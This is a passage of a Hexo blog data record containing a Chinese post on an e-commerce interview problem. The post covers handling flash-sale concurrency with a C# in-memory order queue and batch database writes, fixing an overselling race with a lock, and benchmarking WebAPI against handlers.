<summary>\n        /// 订单队列启动\n        /// </summary>\n        public static void Start()\n        {\n            _thread = new Thread(new ThreadStart(OrderDispose));\n            _thread.Start();\n        }\n\n        /// <summary>\n        /// 缓存结束\n        /// </summary>\n        public static void End()\n        {\n            lock (_locker)\n            {\n                _thread.Abort();\n                _service.OrderTrans(_orders);\n                _orders.Clear();\n            }\n        }\n\n\n        /// <summary>\n        /// 下单\n        /// </summary>\n        public static string OrderBuy(Order o)\n        {\n            lock (_locker)\n            {\n                _orders.Add(o);\n            }\n            return o.OrderId;\n        }\n\n        /// <summary>\n        /// 支付\n        /// </summary>\n        public static bool OrderPay(RequestPay o, DateTime? paytime)\n        {\n            lock (_locker)\n            {\n            \tOrder order = null;\n                int index = _orders.FindIndex(t => t.OrderId == o.order_id && t.UserId == o.uid);\n                if (index >= 0)///已存在缓存中\n                {\n                    _orders[index].PayTime = paytime;\n                    return true;\n                }            \t\n                order = _service.GetOrder(o.order_id);\n                if (order == null)\n                    return false;\n                else///已存在数据库中\n                {\n                    order.PayTime = paytime;\n                    lock (_locker)\n                    {\n                        _orders.Add(order);\n                    }\n                    return true;\n                }\n            }\n        }\n\n\n        /// <summary>\n        /// 判断队列是否已满\n        /// </summary>\n        public static bool isFull()\n        {\n            return _orders.Count >= Constant.QueueMaxCount ? true : false;\n        }\n\n        /// <summary>\n        /// 订单队列处理事件\n        /// </summary>\n        private static void OrderDispose()\n        {\n            while (true)\n            {\n                //DateTime starttime = DateTime.Now;\n                lock (_locker)\n                {\n                   List<Order> orders =  _orders.Take(Constant.MaxOrderDispose).ToList();\n                    _service.OrderTrans(orders.ToList());//调用数据库接口处理订单\n                    foreach (Order o in orders)\n                        _orders.Remove(o);\n                }\n                Thread.Sleep(Constant.QueueDisposeTimeSpan);//每次处理完成休眠\n                //DateTime endtime = DateTime.Now;\n                //System.Diagnostics.Debug.WriteLine(\"Yanbin TimeSpan:\"+endtime.Subtract(starttime).Milliseconds);\n            }\n        }\n    }\n```\n\n缓存我直接使用的静态对像，效果是一样的。批量提交的方法是 _service.OrderTrans，在这里就不列出来，但是一些数据库操作。\n\n订单队列启动与结束\n\n``` CSharp\n    public class WebApiApplication : System.Web.HttpApplication\n    {\n        protected void Application_Start()\n        {\n            //订单队列初始化\n            OrderCacheQuene.Start();\n        }\n\n        protected void Application_End()\n        {\n            //结束处理\n            OrderCacheQuene.End();\n        }\n    }\n```\n\n### 坑1:超卖\n程序实现以后，我写了一个测试程序去跑它，跑到200线程时超卖了，思来想去之后发现是判断的问题，开始下单时的判断条件没有放到订单队列程序里面。因为并发大，所以有一些客户端请求下单的时候,程序判断是满足下单条件,但是还有一些客户端的请求正在响应，把订单加入缓存了，造成判断不一致，最终引起超卖。所以下单的条件判断需要加到锁里面，虽然对性能上有一些损耗，但是可以保证不会超卖。\n\n``` CSharp\n        /// <summary>\n        /// 下单\n        /// </summary>\n        public static string OrderBuy(Order o)\n        {\n\n            lock (_locker)\n            {\n\t            if (队列已满，已卖空，已下单等条件)\n\t            \treturn null;            \t\n                _orders.Add(o);\n            }\n            return o.OrderId;\n        }\n```\n\n### 坑2:效率坑\n做web接口，在.net的系统中当然用webapi,更种好处用过都知道，没想到在高并发的条件下效率不如handler。以下这些数据是在我这台旧的笔记本上测试出来的。\n\n|线程数|线程调用接口数|处理方式|说明|产生订单数|接口方式|完成时间(秒)|完成时间(分钟)|处理请求总数|平均每秒处理请求|\n|-------|-------|-------|-------|-------|-------|-------|-------|-------|\n|2000|100|只查询|2000人同时查100种商品|0|handler|650.5|10.84|199706|307.004|\n|2000|100|只查询|2000人同时查100种商品|0|api|1180.8|19.68|199747|169.162|\n|1000|50|只查询|1000人同时查50种商品|0|handler|86.3|1.44|49932|578.586|\n|1000|50|只查询|1000人同时查50种商品|0|api|103.9|1.73|49948|480.731|\n|2000|10|抢购|2000人抢100个订单|100|handler|81.9|1.37|40430|493.651|\n|2000|10|抢购|2000人抢100个订单|100|api|79.7|1.33|28738|360.577|\n|2000|50|并发购买|50个人同时买2000种不同商品|100000|Handler|3467|57.78299471|86.378|\n|2000|50|并发购买|50个人同时买2000种不同商品|100000|api|3638|60.63|299375|82.291|\n\n从上图可以看出，在高并发情况下webapi的性能确实不行。\n\n### 开发总结\n\n* 锁在高并发的情况下的使用，如何满足业务要求。\n* 缓存的使用，缓存与数据库之间的数据如何保持一致。\n* 对于大型电商网站，缓存队列需要设置上限，不然会引起内存问题，不过在这里不是这道题目的重点。\n\n[源码下载](https://github.com/binyanbin/interview/)\n\n","source":"_posts/interview-hishop.md","raw":"---\ntitle: 电商面试题\ndate: 2016-2-18\ndesc: 电商 抢购 超卖\n---\n15年年底去一家电商服务公司面试，其中有一道题目是如何解决电商站点商品秒杀的相关问题。[面试题目可以参见](https://github.com/hishopdc/dc2015)。固定的数据库结构下实现三个接口，查看、下单、付款。\n<!-- more -->\n## 主要问题:高并发查询及更新数据库\n解决的方案其实比较其实并不复杂，也很常规。无非就是用缓存队列实现批量更新数据库。把下单的数据放入队列中，然后批量更新到数据库中去。说起来比较简单，实践中还是踩了一些坑。\n\n### 主要实现逻辑\n\n订单处理类\n``` CSharp\n    /// <summary>\n    /// 订单缓存队列处理类\n    /// </summary>\n    public class OrderCacheQuene\n    {\n        /// <summary>\n        /// 订单队列缓存\n        /// </summary>\n        private static List<Order> _orders;\n        /// <summary>\n        /// 数据库操作接口\n        /// </summary>\n        private static IPromotion _service;\n        /// <summary>\n        /// 锁\n        /// </summary>\n        private static object _locker = new object();\n        /// <summary>\n        /// 队列处理线程\n        /// </summary>\n        private static Thread _thread;\n\n        /// <summary>\n        /// 订单队列启动\n        /// </summary>\n        public static void Start()\n        {\n            _thread = new Thread(new ThreadStart(OrderDispose));\n            _thread.Start();\n        }\n\n        /// <summary>\n        /// 缓存结束\n        /// </summary>\n        public static void End()\n        {\n            lock (_locker)\n            {\n                _thread.Abort();\n                _service.OrderTrans(_orders);\n                _orders.Clear();\n            }\n        }\n\n\n        /// <summary>\n        /// 下单\n        /// </summary>\n        public static string OrderBuy(Order o)\n        {\n            lock (_locker)\n            {\n                _orders.Add(o);\n            }\n            return o.OrderId;\n        }\n\n        /// <summary>\n        /// 支付\n        /// </summary>\n        public static bool OrderPay(RequestPay o, DateTime? paytime)\n        {\n            lock (_locker)\n            {\n            \tOrder order = null;\n                int index = _orders.FindIndex(t => t.OrderId == o.order_id && t.UserId == o.uid);\n                if (index >= 0)///已存在缓存中\n                {\n                    _orders[index].PayTime = paytime;\n                    return true;\n                }            \t\n                order = _service.GetOrder(o.order_id);\n                if (order == null)\n                    return false;\n                else///已存在数据库中\n                {\n                    order.PayTime = paytime;\n                    lock (_locker)\n                    {\n                        _orders.Add(order);\n                    }\n                    return true;\n                }\n            }\n        }\n\n\n        /// <summary>\n        /// 判断队列是否已满\n        /// </summary>\n        public static bool isFull()\n        {\n            return _orders.Count >= Constant.QueueMaxCount ? true : false;\n        }\n\n        /// <summary>\n        /// 订单队列处理事件\n        /// </summary>\n        private static void OrderDispose()\n        {\n            while (true)\n            {\n                //DateTime starttime = DateTime.Now;\n                lock (_locker)\n                {\n                   List<Order> orders =  _orders.Take(Constant.MaxOrderDispose).ToList();\n                    _service.OrderTrans(orders.ToList());//调用数据库接口处理订单\n                    foreach (Order o in orders)\n                        _orders.Remove(o);\n                }\n                Thread.Sleep(Constant.QueueDisposeTimeSpan);//每次处理完成休眠\n                //DateTime endtime = DateTime.Now;\n                //System.Diagnostics.Debug.WriteLine(\"Yanbin TimeSpan:\"+endtime.Subtract(starttime).Milliseconds);\n            }\n        }\n    }\n```\n\n缓存我直接使用的静态对像，效果是一样的。批量提交的方法是 _service.OrderTrans，在这里就不列出来，但是一些数据库操作。\n\n订单队列启动与结束\n\n``` CSharp\n    public class WebApiApplication : System.Web.HttpApplication\n    {\n        protected void Application_Start()\n        {\n            //订单队列初始化\n            OrderCacheQuene.Start();\n        }\n\n        protected void Application_End()\n        {\n            //结束处理\n            OrderCacheQuene.End();\n        }\n    }\n```\n\n### 坑1:超卖\n程序实现以后，我写了一个测试程序去跑它，跑到200线程时超卖了，思来想去之后发现是判断的问题，开始下单时的判断条件没有放到订单队列程序里面。因为并发大，所以有一些客户端请求下单的时候,程序判断是满足下单条件,但是还有一些客户端的请求正在响应，把订单加入缓存了，造成判断不一致，最终引起超卖。所以下单的条件判断需要加到锁里面，虽然对性能上有一些损耗，但是可以保证不会超卖。\n\n``` CSharp\n        /// <summary>\n        /// 下单\n        /// </summary>\n        public static string OrderBuy(Order o)\n        {\n\n            lock (_locker)\n            {\n\t            if (队列已满，已卖空，已下单等条件)\n\t            \treturn null;            \t\n                _orders.Add(o);\n            }\n            return o.OrderId;\n        }\n```\n\n### 坑2:效率坑\n做web接口，在.net的系统中当然用webapi,更种好处用过都知道，没想到在高并发的条件下效率不如handler。以下这些数据是在我这台旧的笔记本上测试出来的。\n\n|线程数|线程调用接口数|处理方式|说明|产生订单数|接口方式|完成时间(秒)|完成时间(分钟)|处理请求总数|平均每秒处理请求|\n|-------|-------|-------|-------|-------|-------|-------|-------|-------|\n|2000|100|只查询|2000人同时查100种商品|0|handler|650.5|10.84|199706|307.004|\n|2000|100|只查询|2000人同时查100种商品|0|api|1180.8|19.68|199747|169.162|\n|1000|50|只查询|1000人同时查50种商品|0|handler|86.3|1.44|49932|578.586|\n|1000|50|只查询|1000人同时查50种商品|0|api|103.9|1.73|49948|480.731|\n|2000|10|抢购|2000人抢100个订单|100|handler|81.9|1.37|40430|493.651|\n|2000|10|抢购|2000人抢100个订单|100|api|79.7|1.33|28738|360.577|\n|2000|50|并发购买|50个人同时买2000种不同商品|100000|Handler|3467|57.78299471|86.378|\n|2000|50|并发购买|50个人同时买2000种不同商品|100000|api|3638|60.63|299375|82.291|\n\n从上图可以看出，在高并发情况下webapi的性能确实不行。\n\n### 开发总结\n\n* 锁在高并发的情况下的使用，如何满足业务要求。\n* 缓存的使用，缓存与数据库之间的数据如何保持一致。\n* 对于大型电商网站，缓存队列需要设置上限，不然会引起内存问题，不过在这里不是这道题目的重点。\n\n[源码下载](https://github.com/binyanbin/interview/)\n\n","slug":"interview-hishop","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llt9000jg2x65yogn3kk","content":"<p>15年年底去一家电商服务公司面试，其中有一道题目是如何解决电商站点商品秒杀的相关问题。<a href=\"https://github.com/hishopdc/dc2015\" target=\"_blank\" rel=\"external\">面试题目可以参见</a>。固定的数据库结构下实现三个接口，查看、下单、付款。<br><a id=\"more\"></a></p>\n<h2 id=\"主要问题-高并发查询及更新数据库\"><a href=\"#主要问题-高并发查询及更新数据库\" class=\"headerlink\" title=\"主要问题:高并发查询及更新数据库\"></a>主要问题:高并发查询及更新数据库</h2><p>解决的方案其实比较其实并不复杂，也很常规。无非就是用缓存队列实现批量更新数据库。把下单的数据放入队列中，然后批量更新到数据库中去。说起来比较简单，实践中还是踩了一些坑。</p>\n<h3 id=\"主要实现逻辑\"><a href=\"#主要实现逻辑\" class=\"headerlink\" title=\"主要实现逻辑\"></a>主要实现逻辑</h3><p>订单处理类<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> 订单缓存队列处理类</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">OrderCacheQuene</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 订单队列缓存</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> List&lt;Order&gt; _orders;</span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 数据库操作接口</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> IPromotion _service;</span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 锁</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">object</span> _locker = <span class=\"keyword\">new</span> <span class=\"keyword\">object</span>();</span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 队列处理线程</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Thread _thread;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 订单队列启动</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Start</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        _thread = <span class=\"keyword\">new</span> Thread(<span class=\"keyword\">new</span> ThreadStart(OrderDispose));</span><br><span class=\"line\">        _thread.Start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 缓存结束</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">End</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            _thread.Abort();</span><br><span class=\"line\">            _service.OrderTrans(_orders);</span><br><span class=\"line\">            _orders.Clear();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 下单</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">string</span> <span class=\"title\">OrderBuy</span>(<span class=\"params\">Order o</span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            _orders.Add(o);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> o.OrderId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 支付</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">bool</span> <span class=\"title\">OrderPay</span>(<span class=\"params\">RequestPay o, DateTime? paytime</span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        \tOrder order = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> index = _orders.FindIndex(t =&gt; t.OrderId == o.order_id &amp;&amp; t.UserId == o.uid);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (index &gt;= <span class=\"number\">0</span>)<span class=\"comment\"><span class=\"doctag\">///</span>已存在缓存中</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                _orders[index].PayTime = paytime;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;            \t</span><br><span class=\"line\">            order = _service.GetOrder(o.order_id);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (order == <span class=\"literal\">null</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            <span class=\"keyword\">else</span><span class=\"comment\"><span class=\"doctag\">///</span>已存在数据库中</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                order.PayTime = paytime;</span><br><span class=\"line\">                <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    _orders.Add(order);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 判断队列是否已满</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">bool</span> <span class=\"title\">isFull</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> _orders.Count &gt;= Constant.QueueMaxCount ? <span class=\"literal\">true</span> : <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> 订单队列处理事件</span></span><br><span class=\"line\">    <span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">OrderDispose</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">//DateTime starttime = DateTime.Now;</span></span><br><span class=\"line\">            <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">               List&lt;Order&gt; orders =  _orders.Take(Constant.MaxOrderDispose).ToList();</span><br><span class=\"line\">                _service.OrderTrans(orders.ToList());<span class=\"comment\">//调用数据库接口处理订单</span></span><br><span class=\"line\">                <span class=\"keyword\">foreach</span> (Order o <span class=\"keyword\">in</span> orders)</span><br><span class=\"line\">                    _orders.Remove(o);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            Thread.Sleep(Constant.QueueDisposeTimeSpan);<span class=\"comment\">//每次处理完成休眠</span></span><br><span class=\"line\">            <span class=\"comment\">//DateTime endtime = DateTime.Now;</span></span><br><span class=\"line\">            <span class=\"comment\">//System.Diagnostics.Debug.WriteLine(\"Yanbin TimeSpan:\"+endtime.Subtract(starttime).Milliseconds);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>缓存我直接使用的静态对像，效果是一样的。批量提交的方法是 _service.OrderTrans，在这里就不列出来，但是一些数据库操作。</p>\n<p>订单队列启动与结束</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class WebApiApplication : System.Web.HttpApplication</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    protected void Application_Start()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        //订单队列初始化</span><br><span class=\"line\">        OrderCacheQuene.Start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    protected void Application_End()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        //结束处理</span><br><span class=\"line\">        OrderCacheQuene.End();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"坑1-超卖\"><a href=\"#坑1-超卖\" class=\"headerlink\" title=\"坑1:超卖\"></a>坑1:超卖</h3><p>程序实现以后，我写了一个测试程序去跑它，跑到200线程时超卖了，思来想去之后发现是判断的问题，开始下单时的判断条件没有放到订单队列程序里面。因为并发大，所以有一些客户端请求下单的时候,程序判断是满足下单条件,但是还有一些客户端的请求正在响应，把订单加入缓存了，造成判断不一致，最终引起超卖。所以下单的条件判断需要加到锁里面，虽然对性能上有一些损耗，但是可以保证不会超卖。</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;summary&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> 下单</span></span><br><span class=\"line\"><span class=\"comment\"><span class=\"doctag\">///</span> <span class=\"doctag\">&lt;/summary&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">string</span> <span class=\"title\">OrderBuy</span>(<span class=\"params\">Order o</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">lock</span> (_locker)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (队列已满，已卖空，已下单等条件)</span><br><span class=\"line\">     \t<span class=\"keyword\">return</span> <span class=\"literal\">null</span>;            \t</span><br><span class=\"line\">        _orders.Add(o);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> o.OrderId;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"坑2-效率坑\"><a href=\"#坑2-效率坑\" class=\"headerlink\" title=\"坑2:效率坑\"></a>坑2:效率坑</h3><p>做web接口，在.net的系统中当然用webapi,更种好处用过都知道，没想到在高并发的条件下效率不如handler。以下这些数据是在我这台旧的笔记本上测试出来的。</p>\n<table>\n<thead>\n<tr>\n<th>线程数</th>\n<th>线程调用接口数</th>\n<th>处理方式</th>\n<th>说明</th>\n<th>产生订单数</th>\n<th>接口方式</th>\n<th>完成时间(秒)</th>\n<th>完成时间(分钟)</th>\n<th>处理请求总数</th>\n<th>平均每秒处理请求</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>2000</td>\n<td>100</td>\n<td>只查询</td>\n<td>2000人同时查100种商品</td>\n<td>0</td>\n<td>handler</td>\n<td>650.5</td>\n<td>10.84</td>\n<td>199706</td>\n<td>307.004</td>\n</tr>\n<tr>\n<td>2000</td>\n<td>100</td>\n<td>只查询</td>\n<td>2000人同时查100种商品</td>\n<td>0</td>\n<td>api</td>\n<td>1180.8</td>\n<td>19.68</td>\n<td>199747</td>\n<td>169.162</td>\n</tr>\n<tr>\n<td>1000</td>\n<td>50</td>\n<td>只查询</td>\n<td>1000人同时查50种商品</td>\n<td>0</td>\n<td>handler</td>\n<td>86.3</td>\n<td>1.44</td>\n<td>49932</td>\n<td>578.586</td>\n</tr>\n<tr>\n<td>1000</td>\n<td>50</td>\n<td>只查询</td>\n<td>1000人同时查50种商品</td>\n<td>0</td>\n<td>api</td>\n<td>103.9</td>\n<td>1.73</td>\n<td>49948</td>\n<td>480.731</td>\n</tr>\n<tr>\n<td>2000</td>\n<td>10</td>\n<td>抢购</td>\n<td>2000人抢100个订单</td>\n<td>100</td>\n<td>handler</td>\n<td>81.9</td>\n<td>1.37</td>\n<td>40430</td>\n<td>493.651</td>\n</tr>\n<tr>\n<td>2000<